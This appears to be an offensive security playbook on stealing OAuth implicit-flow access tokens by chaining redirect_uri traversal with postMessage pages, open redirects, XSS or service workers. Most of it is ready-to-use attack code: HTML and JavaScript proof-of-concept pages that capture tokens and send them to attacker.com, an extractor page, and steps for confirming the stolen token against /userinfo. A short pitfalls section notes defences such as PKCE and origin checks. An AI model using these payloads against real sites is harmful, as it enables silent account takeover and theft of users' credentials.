# OAuth — Authorization Code / Token Theft via postMessage / Open Redirect

## When this applies

- Application uses Implicit Flow (response_type=token) — access token in URL fragment.
- Vulnerable redirect_uri allows directory traversal to a page that posts data via `postMessage`.
- Or the redirect_uri can be chained through an open redirect that exposes the URL fragment.

## Technique

Tokens delivered in URL fragments (`#access_token=...`) are not sent in HTTP requests, but JavaScript on the redirected page can read `window.location.hash`. Combined with a postMessage listener or open redirect, the attacker exfiltrates the token.

## Steps

### 1. Identify Implicit Flow usage

Authorization request has `response_type=token`:
```http
GET /auth?client_id=ID&redirect_uri=...&response_type=token HTTP/1.1
```

Authorization response delivers token in fragment:
```http
HTTP/1.1 302 Found
Location: https://app.com/callback#access_token=ACCESS_TOKEN&token_type=Bearer&expires_in=3600
```

### 2. Find a postMessage-emitting page on the same origin

Many apps post `window.location.href` (or fragment data) to parent windows for legitimate reasons (popups, iframes for OAuth). E.g. a comment form that says "loaded successfully" via postMessage.

Look for endpoints like:
- `/post/comment/comment-form`
- `/oauth/popup-callback`
- `/widget/embed`

### 3. Chain via directory traversal in `redirect_uri`

```html
<!DOCTYPE html>
<html>
<body>
<iframe
    id="oauth-frame"
    src="https://oauth-server.com/auth?client_id=ID&redirect_uri=https://victim.com/oauth-callback/../post/comment/comment-form&response_type=token&nonce=123&scope=openid%20profile%20email">
</iframe>

<script>
window.addEventListener('message', function(e) {
    fetch('https://attacker.com/collect?data=' + encodeURIComponent(JSON.stringify(e.data)));
}, false);
</script>
</body>
</html>
```

Flow:
1. Victim visits attacker page.
2. iframe triggers OAuth flow with manipulated redirect_uri.
3. Provider redirects to `https://victim.com/oauth-callback/../post/comment/comment-form#access_token=...`, which (after path normalization) becomes `https://victim.com/post/comment/comment-form#access_token=...`.
4. The comment-form page postMessages window.location.href to the parent.
5. Attacker page receives the message, exfiltrates to attacker.com/collect.

### 4. Open redirect chain (alternative)

When victim.com has an open redirect like `/post/next?path=...`:

```html
<iframe
    src="https://oauth-server.com/auth?client_id=ID&redirect_uri=https://victim.com/oauth-callback/../post/next?path=https://attacker.com/extract&response_type=token&nonce=456&scope=openid%20profile%20email">
</iframe>
```

The OAuth response lands at `victim.com/post/next?path=https://attacker.com/extract#access_token=...`. The open redirect forwards to `attacker.com/extract#access_token=...`, preserving the fragment.

Token-extractor page at attacker.com/extract:

```html
<!DOCTYPE html>
<html>
<body>
<script>
if (window.location.hash) {
    var fragment = window.location.hash.substring(1);
    var params = new URLSearchParams(fragment);
    var token = params.get('access_token');

    if (token) {
        fetch('/collect?token=' + encodeURIComponent(token));
    }
    // Or redirect entire fragment:
    window.location = '/collect?' + fragment;
}
</script>
</body>
</html>
```

### 5. XSS-based fragment theft

If XSS exists on `redirect_uri` domain:

```javascript
// Inject via XSS
var token = window.location.hash.match(/access_token=([^&]*)/)[1];
fetch('https://attacker.com/?token=' + token);
```

### 6. Service worker registration (modern variant)

If the redirect_uri domain allows registering service workers, a malicious worker can intercept all requests including those carrying token data:

```javascript
navigator.serviceWorker.register('/sw.js');
// sw.js
self.addEventListener('fetch', function(event) {
    if (event.request.url.includes('oauth-callback')) {
        // Extract and exfiltrate
    }
});
```

### 7. Validate the stolen token

Use the access token to query victim's identity:

```http
GET /userinfo HTTP/1.1
Host: oauth-server.com
Authorization: Bearer STOLEN_TOKEN
```

Response confirms which user the token belongs to.

## Verifying success

- Attacker server logs receive `?token=...` shortly after victim visits the trap page.
- The exfiltrated token authenticates against `/userinfo` and returns victim's identity.
- The victim is unaware — the iframe runs silently.

## Common pitfalls

- Most modern OAuth providers reject Implicit Flow in favor of Authorization Code Flow + PKCE — the attack class is shrinking.
- Strict CSP on victim.com may block iframes from cross-origin attackers — but iframe sources are not always covered by CSP `frame-ancestors`.
- postMessage origin checks (`event.origin`) are the proper defense — attacker must spoof the origin (impossible from a different domain).
- Browser fragment handling differs: some browsers preserve fragments through redirects, some strip them. Test the chain end-to-end.
- Same-Origin Policy prevents cross-origin reading of `window.location.hash` directly — the attack relies on either same-origin XSS, postMessage, or open redirect chaining.

## Tools

- Burp Suite Collaborator for capturing exfiltrated tokens.
- Custom HTML PoC hosted on attacker.com.
- ngrok for quick public hosting.
- Browser DevTools to trace the fragment through redirects.
